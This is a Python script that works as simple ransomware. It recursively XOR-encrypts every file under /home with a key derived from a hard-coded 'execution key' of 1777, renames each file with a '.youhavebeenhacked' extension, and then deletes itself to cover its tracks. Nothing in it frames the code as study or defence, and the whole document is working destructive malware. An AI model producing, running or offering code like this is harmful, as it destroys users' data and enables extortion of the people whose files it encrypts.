import os
import sys
import hashlib

# XOR function
def xor_encrypt_decrypt(data, key):
    key_len = len(key)
    return bytearray((data[i] ^ key[i % key_len]) for i in range(len(data)))

# Encrypt or decrypt a file using XOR
def xor_file(file_path, key):
    with open(file_path, "rb") as file:
        data = file.read()
    encrypted_data = xor_encrypt_decrypt(data, key.encode())
    with open(file_path, "wb") as file:
        file.write(encrypted_data)

# Generate MD5 hash
def generate_md5_hash(value):
    return hashlib.md5(value.encode()).hexdigest()

# Derive encryption key from the last 4 characters of the MD5 hash
def derive_encryption_key():
    # MD5 hash of the execution key
    hash_value = generate_md5_hash("1777")
    # Derive the encryption key from the last 4 characters of the hash
    derived_key = hash_value[-4:]
    return derived_key

# Check if the correct execution key is provided
def check_execution_key():
    if len(sys.argv) != 2 or sys.argv[1] != "1777":
        print("Invalid execution key! You must provide the correct execution key (e.g., './xor_script.py 1777').")
        return False
    return True

# Perform the encryption operation and add a new extension
def encrypt_files(encryption_key, target_directory):
    for root, dirs, files in os.walk(target_directory):
        for file in files:
            file_path = os.path.join(root, file)
            new_file_path = file_path + ".youhavebeenhacked"  # Add the new extension
            try:
                xor_file(file_path, encryption_key)
                os.rename(file_path, new_file_path)  # Rename the file to add the new extension
                print(f"Encrypted: {new_file_path}")
            except Exception as e:
                print(f"Failed to encrypt {file_path}: {e}")

# Main function
def main():
    if not check_execution_key():
        return

    # Derive the encryption key from the hash of the execution key
    encryption_key = derive_encryption_key()

    target_directory = "/home"  # Target user directories under /home
    encrypt_files(encryption_key, target_directory)

    # Self-delete the script after execution
    script_path = sys.argv[0]  # Path to the script itself
    try:
        os.remove(script_path)
        print(f"Script {script_path} has been deleted.")
    except Exception as e:
        print(f"Failed to delete script {script_path}: {e}")

if __name__ == "__main__":
    main()
